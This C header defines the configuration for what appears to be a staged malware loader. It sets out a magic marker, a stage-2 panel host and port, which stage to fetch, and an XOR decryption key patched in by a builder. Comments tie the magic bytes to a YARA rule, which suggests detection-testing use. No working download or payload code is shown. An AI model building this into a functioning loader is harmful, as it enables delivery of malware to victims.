/*
 * Stage 1 Configuration Header
 *
 * Detection artifact: Magic bytes 0x4F584944 ("OXID")
 * YARA signature target: stage1_magic.yar
 */

#ifndef CONFIG_H
#define CONFIG_H

#include <stdint.h>
#include <stddef.h>

/* Magic identifier for YARA detection */
#define STAGE1_MAGIC 0x4F584944  /* "OXID" in little-endian */

/* Maximum sizes */
#define MAX_URL_LEN 512
#define MAX_KEY_LEN 32

/* Configuration structure - embedded at build time */
typedef struct {
    uint32_t magic;              /* Must be STAGE1_MAGIC */
    uint32_t flags;              /* Reserved for future use */
    uint16_t stage2_port;        /* Panel port (default 8080) */
    uint16_t stage_number;       /* Stage to fetch (2 or 3) */
    uint8_t  xor_key[MAX_KEY_LEN]; /* XOR decryption key */
    uint8_t  xor_key_len;        /* Actual key length */
    uint8_t  reserved[3];        /* Padding */
    char     stage2_host[MAX_URL_LEN]; /* Panel hostname/IP */
} stage1_config_t;

/* Global config - patched by builder */
extern stage1_config_t g_config;

/* Configuration validation */
static inline int config_valid(const stage1_config_t *cfg) {
    return cfg->magic == STAGE1_MAGIC
        && cfg->xor_key_len > 0
        && cfg->xor_key_len <= MAX_KEY_LEN;
}

#endif /* CONFIG_H */
